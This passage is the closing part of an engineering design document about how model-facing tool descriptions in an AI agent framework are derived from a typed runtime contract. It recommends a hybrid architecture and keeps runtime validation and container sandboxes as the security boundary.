- **No Premature SWE Benchmarking**: Does NOT re-run multi-file SWE tasks until tool-input conformance across all tools is verified.

---

## 10. Summary & Recommended Next Steps

1. **Architectural Recommendation**: Adopt **Option D (Hybrid: Typed Runtime Contract + Structured Semantic Metadata Projection)** as the target architecture for model-facing tool descriptions.
2. **Source of Truth**: The runtime typed tool contract (`tool-schemas.ts` and `tool.ts`) remains the single authoritative source of truth. Model-facing descriptions are derived projections.
3. **Security Boundary**: Model-facing schemas provide advisory cognitive guidance only; runtime validation (`ProposalValidator` + `.strict()`), capability policy, and container sandboxes remain the exclusive security boundaries.
4. **Immediate Next Step**: Proceed with a small, test-driven implementation slice adding the declarative metadata descriptors to `ToolDefinition` and implementing the pure projection function with unit and drift-detection tests.
